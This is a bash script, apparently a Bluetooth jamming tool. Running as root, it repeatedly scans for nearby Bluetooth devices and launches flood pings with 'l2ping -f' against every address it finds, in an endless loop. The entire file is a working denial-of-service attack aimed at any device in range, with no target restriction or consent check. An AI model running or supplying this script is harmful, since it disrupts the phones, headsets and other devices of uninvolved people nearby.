#!/usr/bin/env bash
set -euo pipefail

if [ "$EUID" -ne 0 ]; then
    echo "You need to run as root!"
    exit 1
fi

cleanup() {
    killall l2ping
    printf "\n"
    read -p "Do you want to turn off bluetooth (hci0)? [Y/n] " RESP
    if [ $RESP == 'Y' ]; then
        echo "Turning bluetooth off..."
        sudo hciconfig hci0 down
        echo "Done!"
    fi
    exit 0
}

trap cleanup EXIT

echo "Turning bluetooth on (hci0)..."
sudo hciconfig hci0 up
echo "Done!"

while [ 1 ]; do
    DEVICES=$(hcitool scan | awk 'length NR>2{print $1}')
    for bd_addr in $DEVICES; do
        echo "Pinging ${bd_addr}..."
        sudo l2ping -f $bd_addr > /dev/null 2>/dev/null &
    done
done
